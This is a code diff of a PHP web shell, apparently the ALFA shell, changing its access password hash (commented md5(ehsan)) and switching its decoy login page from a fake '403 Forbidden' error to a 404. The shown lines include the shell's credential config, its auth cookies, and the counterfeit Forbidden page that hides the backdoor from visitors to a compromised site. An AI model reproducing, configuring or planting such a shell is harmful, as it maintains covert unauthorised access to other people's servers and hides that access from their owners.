@@ -8,9 +8,9 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'f9aaf851e0eaf6901fa1dd9d0fcb26f9',//md5(ehsan)
+    'password' => 'be3b44be039e72b4429f1f11bf5082a1',//md5(ehsan)
     'safe_mode' => '1',
-    'login_page' => '403',
+    'login_page' => '404',
     'show_icons' => '1',
     'post_encryption' => true,
     'cgi_api' => false,
@@ -565,7 +565,7 @@ __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
-echo "<!-- dd --><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
 }
 }elseif($config['AlfaLoginPage']=='404'){
